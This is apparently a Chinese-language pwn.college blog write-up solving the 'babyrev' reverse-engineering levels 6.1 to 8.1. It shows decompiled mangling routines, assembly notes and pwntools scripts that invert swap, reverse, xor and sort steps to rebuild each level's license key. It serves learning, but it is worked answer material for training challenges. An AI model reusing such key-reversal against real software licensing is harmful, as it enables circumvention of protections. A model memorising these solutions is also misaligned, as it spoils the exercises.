<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level6.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x80</span>, <span class="number">0xD8</span>, <span class="number">0x4E</span>, <span class="number">0xC7</span>, <span class="number">0X99</span>, <span class="number">0x0B</span>, <span class="number">0x8B</span>, <span class="number">0xC8</span>, <span class="number">0x45</span>, <span class="number">0xC0</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x84</span>, <span class="number">0xC2</span>, <span class="number">0x5F</span>, <span class="number">0xD6</span>, <span class="number">0x82</span>, <span class="number">0x03</span>, <span class="number">0x83</span>]</span><br><span class="line"><span class="comment"># 0x80, 0xD8, 0x4E, 0xC7, 0X99, 0x0B, 0x8B, 0xC8, 0x45, 0xC0, 0x86, 0x06, 0x84, 0xC2, 0x5F, 0xD6, 0x82, 0x03, 0x83</span></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x46</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x1d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    temp = hex_string[i]</span><br><span class="line">    hex_string[i] = hex_string[<span class="number">18</span> - i]</span><br><span class="line">    hex_string[<span class="number">18</span> - i] = temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xeb</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x37</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xf1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>逆序进行即可。还是比较简单的。</p>
<h4 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">This challenge is now mangling your input using the `sort` mangler.</span><br><span class="line">This challenge is now mangling your input using the `swap` mangler for indexes `16` and `21`.</span><br><span class="line">This challenge is now mangling your input using the `swap` mangler for indexes `9` and `22`.</span><br><span class="line">This challenge is now mangling your input using the `swap` mangler for indexes `3` and `6`.</span><br><span class="line">This challenge is now mangling your input using the `reverse` mangler.</span><br><span class="line">Expected result:</span><br><span class="line"></span><br><span class="line">        79 78 78 68 72 73 72 72 72 74 70 6f 6f 6d 6c 6a 77 67 65 62 64 62 64 61 61 61</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level7.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x78</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x6a</span>, <span class="number">0x77</span>, <span class="number">0x67</span>, <span class="number">0x65</span> ,<span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x61</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为sort在第一个的关系，因此实际上我们需要的是找到expected result即可。</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// swap  </span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *((_BYTE *)&amp;buf + i);</span><br><span class="line">    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="number">28</span> - i);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - i) = v6;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//sort</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">27</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">28</span> - j; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;buf + k) &gt; *((_BYTE *)&amp;buf + k + <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = *((_BYTE *)&amp;buf + k);</span><br><span class="line">        *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + k + <span class="number">1</span>);</span><br><span class="line">        *((_BYTE *)&amp;buf + k + <span class="number">1</span>) = v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// swap</span></span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">13</span>; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *((_BYTE *)&amp;buf + m);</span><br><span class="line">    *((_BYTE *)&amp;buf + m) = *((_BYTE *)&amp;buf + <span class="number">28</span> - m);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - m) = v4;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// switch</span></span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">28</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( n % <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x75u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x7Eu</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">1u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x3Du</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0xC5u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-题解/image-20241110102042920.png"  alt="image-20241110102042920" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0f, 0x04, 0x7b, 0x47, 0xbf, 0x0c, 0x06, 0x79, 0x4a, 0xb0, 0x01, 0x0d, 0x70, 0x52, 0xaa, 0x18, 0x12, 0x6a, 0x56, 0xae, 0x1f, 0x16, 0x67, 0x59, 0xa6, 0x16, 0x1c, 0x63, 0x5c</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level7.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x0f</span>, <span class="number">0x04</span>, <span class="number">0x7b</span>, <span class="number">0x47</span>, <span class="number">0xbf</span>, <span class="number">0x0c</span>, <span class="number">0x06</span>, <span class="number">0x79</span>, <span class="number">0x4a</span>, <span class="number">0xb0</span>, <span class="number">0x01</span>, <span class="number">0x0d</span>, <span class="number">0x70</span>, <span class="number">0x52</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0x12</span>, <span class="number">0x6a</span>, <span class="number">0x56</span>, <span class="number">0xae</span>, <span class="number">0x1f</span>, <span class="number">0x16</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0xa6</span>, <span class="number">0x16</span>, <span class="number">0x1c</span>, <span class="number">0x63</span>, <span class="number">0x5c</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    d = i % <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x75</span></span><br><span class="line">    <span class="keyword">elif</span> d == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x7e</span></span><br><span class="line">    <span class="keyword">elif</span> d == <span class="number">2</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x01</span></span><br><span class="line">    <span class="keyword">elif</span> d == <span class="number">3</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x3d</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xc5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">This challenge is now mangling your input using the `swap` mangler for indexes `5` and `22`.</span><br><span class="line">This challenge is now mangling your input using the `reverse` mangler.</span><br><span class="line">This challenge is now mangling your input using the `xor` mangler with key `0x3c7c`</span><br><span class="line">This challenge is now mangling your input using the `sort` mangler.</span><br><span class="line">This challenge is now mangling your input using the `swap` mangler for indexes `18` and `33`.</span><br><span class="line">This challenge is now mangling your input using the `reverse` mangler.</span><br><span class="line">This challenge is now mangling your input using the `swap` mangler for indexes `3` and `10`.</span><br><span class="line">5f 5e 46 53 58 57 57 57 56 56 5a 52 52 4e 4e 4c 4a 5b 1f 1f 1f 1b 19 16 16 14 14 14 12 11 0d 0c 0b 08 06 05</span><br></pre></td></tr></table></figure>



<p>虽然有这么多层修改，但是只需要关心<code>sort</code>前的修改即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level8.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span></span><br><span class="line">hex_string=[<span class="number">0x5f</span>, <span class="number">0x5e</span>, <span class="number">0x46</span>, <span class="number">0x53</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0x5a</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x4e</span>, <span class="number">0x4e</span>, <span class="number">0x4c</span>, <span class="number">0x4a</span>, <span class="number">0x5b</span>, <span class="number">0x1f</span>, <span class="number">0x1f</span>, <span class="number">0x1f</span>, <span class="number">0x1b</span>, <span class="number">0x19</span>, <span class="number">0x16</span>, <span class="number">0x16</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x0d</span>, <span class="number">0x0c</span>, <span class="number">0x0b</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x05</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x3c</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x7c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse</span></span><br><span class="line">reversed_hex_string = hex_string[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">temp = reversed_hex_string[<span class="number">5</span>]</span><br><span class="line">reversed_hex_string[<span class="number">5</span>] = reversed_hex_string[<span class="number">22</span>]</span><br><span class="line">reversed_hex_string[<span class="number">22</span>] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(reversed_hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(reversed_hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// swap  		0x5e97a08d5571</span></span><br><span class="line">v3 = BYTE6(v15);</span><br><span class="line">  BYTE6(v15) = v17;</span><br><span class="line">  LOBYTE(v17) = v3;</span><br><span class="line"><span class="comment">// reverse		</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">17</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *((_BYTE *)&amp;buf + i);</span><br><span class="line">    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="number">36</span> - i);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">36</span> - i) = v7;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// swap		0x5e97a08d55de </span></span><br><span class="line">  v4 = BYTE3(buf);</span><br><span class="line">  BYTE3(buf) = BYTE4(v14);</span><br><span class="line">  BYTE4(v14) = v4;</span><br><span class="line"><span class="comment">// xor</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">36</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( j % <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xA4u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;buf + j) ^= <span class="number">0x48u</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// reverse</span></span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">17</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *((_BYTE *)&amp;buf + k);</span><br><span class="line">    *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + <span class="number">36</span> - k);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">36</span> - k) = v6;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// reverse</span></span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">17</span>; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *((_BYTE *)&amp;buf + m);</span><br><span class="line">    *((_BYTE *)&amp;buf + m) = *((_BYTE *)&amp;buf + <span class="number">36</span> - m);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">36</span> - m) = v5;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// xor</span></span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">36</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( n % <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x5Cu</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0xA3u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0xBDu</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x29u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x6Cu</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x79, 0x76, 0x8c, 0xe8, 0x55, 0x8e, 0x93, 0x75, 0x0b, 0xbc, 0x64, 0x69, 0x9b, 0xe8, 0x5d, 0x97, 0x9d, 0x77, 0x10, 0xb2, 0x7b, 0x6e, 0x9b, 0xe9, 0x4b, 0x93, 0x87, 0x6b, 0x13, 0xbd, 0x75, 0x60, 0x9b, 0xf9, 0x53, 0x8f, 0x93</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">movzx   eax, byte ptr [rbp+buf+3]		# byte ptr [rbp + buf + 3]</span><br><span class="line">mov     [rbp+var_4C], al</span><br><span class="line">movzx   eax, byte ptr [rbp+var_28+4]	# byte ptr [rbp + buf + 6]	</span><br><span class="line">mov     [rbp+var_4B], al</span><br><span class="line">movzx   eax, [rbp+var_4B]</span><br><span class="line">mov     byte ptr [rbp+buf+3], al</span><br><span class="line">movzx   eax, [rbp+var_4C]</span><br><span class="line">mov     byte ptr [rbp+var_28+4], al		# 交换3和6</span><br><span class="line">mov     [rbp+var_40], 0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">movzx   eax, byte ptr [rbp+var_20+6]		# 等价为 byte ptr [rbp + buf + 16]</span><br><span class="line">mov     [rbp+var_4E], al</span><br><span class="line">movzx   eax, byte ptr [rbp+var_10]			# 等价为 byte ptr [rbp + buf + 20]</span><br><span class="line">mov     [rbp+var_4D], al</span><br><span class="line">movzx   eax, [rbp+var_4D]</span><br><span class="line">mov     byte ptr [rbp+var_20+6], al			# 交换16和20</span><br><span class="line">movzx   eax, [rbp+var_4E]</span><br><span class="line">mov     byte ptr [rbp+var_10], al</span><br></pre></td></tr></table></figure>

<p>动态调试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原始输入：</span><br><span class="line">xwwtngaurrlkodniozqnvoyennptjlxvqeyqm		22 ---- 32</span><br><span class="line">第一个： 0x5ee6a471a571 (断点地址)</span><br><span class="line">xwwtngaurrlkodniozqnvoqennptjlxvyeyqm</span><br><span class="line">第二个： 0x5ee6a471a5de</span><br><span class="line">xwwtngaurrlkodniozqnvoqennptjlxvyeyqm</span><br><span class="line"></span><br><span class="line">xwwtngaurrlkodniozqnvoyennptjlevqxyqm</span><br></pre></td></tr></table></figure>

